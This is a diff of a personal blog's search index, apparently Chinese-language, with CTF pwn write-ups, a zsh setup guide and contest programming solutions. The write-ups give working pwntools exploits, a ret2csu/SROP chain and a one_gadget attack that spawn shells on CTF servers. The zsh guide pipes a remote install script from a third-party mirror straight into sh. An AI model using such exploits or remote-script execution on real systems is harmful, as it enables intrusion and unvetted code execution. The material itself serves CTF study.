+<h2 id="配置生效-1"><a href="#配置生效-1" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>最后若是字体没有生效导致有乱码</p>
+<ul>
+<li><p>打开新的 Terminal 看是否生效</p>
+</li>
+<li><p>执行</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fonts-powerline</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="/.ink//image-20210724161512808.png" alt="image-20210724161512808"></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTFShow_0x1</title>
-    <url>/2021/03/30/CTFShow_0x1/</url>
+    <url>/2021/03/30/Pwn_CTFShow_01/</url>
     <content><![CDATA[<h1 id="Pwn-CTFShow"><a href="#Pwn-CTFShow" class="headerlink" title="Pwn_CTFShow"></a>Pwn_CTFShow</h1><span id="more"></span>
 <h2 id="1-PWN签到题"><a href="#1-PWN签到题" class="headerlink" title="1.PWN签到题"></a>1.PWN签到题</h2><p>直接 <code>nc</code></p>
 <p>出flag，白给</p>
@@ -706,115 +816,6 @@
       </categories>
   </entry>
   <entry>
-    <title>SROP</title>
-    <url>/2021/03/24/SROP/</url>
-    <content><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><span id="more"></span>
-<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="_ciscn_2019_s_3"></a>_ciscn_2019_s_3</h2><p>main里只有一个vuln函数<br>直接进去看</p>
-<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202170418.png" alt="205415324135211"></p>
-<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202171801.png" alt="202"></p>
-<p>看汇编分析：</p>
-<p>需要在栈上构造/bin/sh，并且需要rax=59让64位的syscall执行execve才能getshell</p>
-<p>64 位：系统调用号放入 rax，参数依次放到 rdi、rsi、rdx，返回值放在 rax</p>
-<p>64位程序前六个寄存器调用顺序：rdi rsi rdx rcx r8 r9</p>
-<p>寄存器大概布局：<br>rax = 59<br>rdi = /bin/sh<br>rsi = 0<br>rdx = 0</p>
-<p>注意到vuln函数末尾并没有使用leave指令，即直接把之前push的rbp当作return address<br>我们要ROP的话offset只需要0x10</p>
-<p>先构造/bin/sh在栈中</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211800.png" alt="20201202211800"></p>
-<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211855.png" alt="20201202211855"></p>
-<p>发现/bin/sh已经在栈中了，在打印到0x20的时候，接下来是打印出来一个地址，这也是为什么需要recv的原因，这个地址是栈上面的，所以只要算出这个地址和/bin/sh地址的相对偏移，就可以在程序每次执行的时候算出binsh的地址了，因为地址会变，但是偏移不会</p>
-<p>我们输出了地址stack_addr</p>
-<p>计算偏移量 0x7ffdc7824d78 - 0x007FFDC7824C60 = 0x118</p>
-<p>所以计算binsh_addr = stack_addr - 0x118</p>
-<p>构造完/bin/sh之后，在程序中有给我们一个gadgets函数：</p>
-<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203155951.png" alt="20201203155951"></p>
-<p>只要我们跳到地址0x4004E2就能把3Bh（59）赋值给rax，这样系统调用号的参数也搞定了</p>
-<p>接下来可以利用csu把 rsi = 0，rdx = 0 ，最后用pop rdi ; ret存上/bin/sh就万事大吉了</p>
-<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203161803.png" alt="20201203161803"></p>
-<p>需要注意的是call这个地方call的是r12地址上的内容，我们这里要call的是mov rax,3Bh ，而mov rax,3Bh可以存在/bin/sh\x00aaaaaaaa(一共长0x10)后面，所以r12 = binsh_addr + 0x10</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27933</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">pop_rbx_rbp_r12_r13_14_r15 = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_r13 = <span class="number">0x400580</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(mov_rax_59) </span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_14_r15) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr+<span class="number">0x10</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_r13) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">6</span>*<span class="number">8</span>+<span class="number">8</span>) </span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/edumds">参考链接</a></p>
-<h2 id="SROP-1"><a href="#SROP-1" class="headerlink" title="SROP"></a>SROP</h2><p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.binary=(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">sigret=<span class="number">0x4004DA</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(pl1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip= sys</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">pl2=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(pl2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">参考链接</a></p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>SROP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu20_zsh</title>
-    <url>/2021/07/24/Ubuntu20_zsh/</url>
-    <content><![CDATA[<h1 id="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"><a href="#Ubuntu20下zsh、oh-my-zsh、插件和主题安装" class="headerlink" title="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"></a>Ubuntu20下zsh、oh-my-zsh、插件和主题安装</h1><p>之前ubuntu16 18都没写过自己安装zsh的过程，借此次ubuntu20顺手写一下</p>
-<span id="more"></span>
-
-<h2 id="检查当前可用的shell："><a href="#检查当前可用的shell：" class="headerlink" title="检查当前可用的shell："></a>检查当前可用的shell：</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
-
-<h2 id="查看当前使用的shell："><a href="#查看当前使用的shell：" class="headerlink" title="查看当前使用的shell："></a>查看当前使用的shell：</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br></pre></td></tr></table></figure>
-
-<h2 id="把默认的Shell改成zsh"><a href="#把默认的Shell改成zsh" class="headerlink" title="把默认的Shell改成zsh"></a>把默认的Shell改成zsh</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
-
-<p>注意：不要使用sudo</p>
-<h2 id="配置密码文件，解决chsh-PAM认证失败的问题"><a href="#配置密码文件，解决chsh-PAM认证失败的问题" class="headerlink" title="配置密码文件，解决chsh: PAM认证失败的问题"></a>配置密码文件，解决chsh: PAM认证失败的问题</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.ink//image-20210724130411040.png" alt="image-20210724130411040"></p>
-<h2 id="安装-curl"><a href="#安装-curl" class="headerlink" title="安装 curl"></a>安装 curl</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><p>curl：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<p>wget：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/.ink//image-20210724130842599.png" alt="image-20210724130842599"></p>
-<h2 id="下载-zsh-syntax-highlighting-语法高亮插件"><a href="#下载-zsh-syntax-highlighting-语法高亮插件" class="headerlink" title="下载 zsh-syntax-highlighting 语法高亮插件"></a>下载 zsh-syntax-highlighting 语法高亮插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
-
-<h2 id="下载-zsh-autosuggestions-自动提示插件"><a href="#下载-zsh-autosuggestions-自动提示插件" class="headerlink" title="下载 zsh-autosuggestions 自动提示插件"></a>下载 zsh-autosuggestions 自动提示插件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置生效"><a href="#配置生效" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置-zshrc文件"><a href="#配置-zshrc文件" class="headerlink" title="配置.zshrc文件"></a>配置.zshrc文件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>plugins=(git zsh-syntax-highlighting zsh-autosuggestions)</p>
-</blockquote>
-<h1 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h1><h2 id="下载powerline"><a href="#下载powerline" class="headerlink" title="下载powerline"></a>下载powerline</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install powerline-status --user</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装PowerFonts"><a href="#安装PowerFonts" class="headerlink" title="安装PowerFonts"></a>安装PowerFonts</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/powerline/fonts.git --depth=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> fonts</span><br><span class="line"></span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/fcamblor/oh-my-zsh-agnoster-fcamblor.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> oh-my-zsh-agnoster-fcamblor/</span><br><span class="line"></span><br><span class="line">./install</span><br></pre></td></tr></table></figure>
-
-<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>ZSH_THEME=”agnoster”</p>
-</blockquote>
-<h2 id="配置生效-1"><a href="#配置生效-1" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>最后若是字体没有生效导致有乱码</p>
-<ul>
-<li><p>打开新的 Terminal 看是否生效</p>
-</li>
-<li><p>执行</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fonts-powerline</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>checksec</title>
     <url>/2021/06/02/checksec/</url>
     <content><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><span id="more"></span>
@@ -856,7 +857,7 @@
   </entry>
   <entry>
     <title>CISCN_2019</title>
-    <url>/2021/06/02/CISCN_2019/</url>
+    <url>/2021/06/02/ciscn_2019/</url>
     <content><![CDATA[<h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
 
 <h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
@@ -894,7 +895,7 @@
   </entry>
   <entry>
     <title>Hello World</title>
-    <url>/2021/03/28/Hello%20World/</url>
+    <url>/2021/03/28/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! </p>
 <span id="more"></span>
 <p>This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -913,27 +914,37 @@
 ]]></content>
   </entry>
   <entry>
-    <title>One_gadget</title>
-    <url>/2021/03/24/One_gadget/</url>
-    <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
-<p>会输出一个printf的地址</p>
-<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>
+    <title>program</title>
+    <url>/2021/04/12/program/</url>
+    <content><![CDATA[<p>记录编程相关</p>
+<span id="more"></span>
 
-<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="2020蓝桥杯省赛"><a href="#2020蓝桥杯省赛" class="headerlink" title="2020蓝桥杯省赛"></a>2020蓝桥杯省赛</h1><h2 id="A-门牌制作"><a href="#A-门牌制作" class="headerlink" title="A 门牌制作"></a>A 门牌制作</h2><p>【问题描述】<br>小蓝要为一条街的住户制作门牌号。<br>这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。<br>小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字<br>符粘贴到门牌上，例如门牌 1017 需要依次粘贴字符 1、 0、 1、 7，即需要 1 个<br>字符 0， 2 个字符 1， 1 个字符 7。<br>请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,t,n=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(t=i;t!=<span class="number">0</span>;t/=<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">if</span>(t%<span class="number">10</span>==<span class="number">2</span>)</span><br><span class="line">				n++;</span><br><span class="line">	cout&lt;&lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>624</p>
+</blockquote>
+<h2 id="试题B-既约分数"><a href="#试题B-既约分数" class="headerlink" title="试题B 既约分数"></a>试题B 既约分数</h2><p>【问题描述】<br>如果一个分数的分子和分母的最大公约数是1，这个分数称为既约分数。例如，3/4 , 5/2 , 1/8 , 7/1都是既约分数。请问，有多少个既约分数，分子和分母都是1 到2020 之间的整数（包括1和2020）？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2020</span>;j++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(k=i;;k--)</span><br><span class="line">    			<span class="keyword">if</span>(i%k==<span class="number">0</span> &amp;&amp; j%k==<span class="number">0</span>)</span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    		<span class="keyword">if</span>(k==<span class="number">1</span>)</span><br><span class="line">    			num++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="试题C-蛇形填数"><a href="#试题C-蛇形填数" class="headerlink" title="试题C 蛇形填数"></a>试题C 蛇形填数</h2><p>【问题描述】<br>如下图所示，小明用从1 开始的正整数“蛇形”填充无限大的矩阵。</p>
+<p><img src="/.ink//image-20210412201731138.png" alt="image-20210412201731138"></p>
+<p>容易看出矩阵第二行第二列中的数是5。请你计算矩阵中第20 行第20 列的数是多少？</p>
+<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<h2 id="试题D-跑步锻炼"><a href="#试题D-跑步锻炼" class="headerlink" title="试题D 跑步锻炼"></a>试题D 跑步锻炼</h2><p>【问题描述】<br>小蓝每天都锻炼身体。<br>正常情况下，小蓝每天跑 1 千米。如果某天是周一或者月初（1 日），为了<br>激励自己，小蓝要跑 2 千米。如果同时是周一或月初，小蓝也是跑 2 千米。<br>小蓝跑步已经坚持了很长时间，从 2000 年 1 月 1 日周六（含）到 2020 年<br>10 月 1 日周四（含）。请问这段时间小蓝总共跑步多少千米？</p>
+<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<h2 id="试题E-七段码"><a href="#试题E-七段码" class="headerlink" title="试题E 七段码"></a>试题E 七段码</h2><p>【问题描述】<br>小蓝要用七段码数码管来表示一种特殊的文字。</p>
+<p>七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。<br>例如：b 发光，其他二极管不发光可以用来表达一种字符。<br>例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。<br>例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。<br>例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。<br>请问，小蓝可以用七段码数码管表达多少种不同的字符？</p>
+<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
 ]]></content>
       <categories>
-        <category>WriteUp</category>
+        <category>program</category>
       </categories>
-      <tags>
-        <tag>OneGadget</tag>
-      </tags>
   </entry>
   <entry>
     <title>orw</title>
@@ -1019,41 +1030,31 @@
       </tags>
   </entry>
   <entry>
-    <title>program</title>
-    <url>/2021/04/12/program/</url>
-    <content><![CDATA[<p>记录编程相关</p>
-<span id="more"></span>
+    <title>One_gadget</title>
+    <url>/2021/03/24/one_gadget/</url>
+    <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
+<p>会输出一个printf的地址</p>
+<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>
 
-<h1 id="2020蓝桥杯省赛"><a href="#2020蓝桥杯省赛" class="headerlink" title="2020蓝桥杯省赛"></a>2020蓝桥杯省赛</h1><h2 id="A-门牌制作"><a href="#A-门牌制作" class="headerlink" title="A 门牌制作"></a>A 门牌制作</h2><p>【问题描述】<br>小蓝要为一条街的住户制作门牌号。<br>这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。<br>小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字<br>符粘贴到门牌上，例如门牌 1017 需要依次粘贴字符 1、 0、 1、 7，即需要 1 个<br>字符 0， 2 个字符 1， 1 个字符 7。<br>请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,t,n=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(t=i;t!=<span class="number">0</span>;t/=<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">if</span>(t%<span class="number">10</span>==<span class="number">2</span>)</span><br><span class="line">				n++;</span><br><span class="line">	cout&lt;&lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
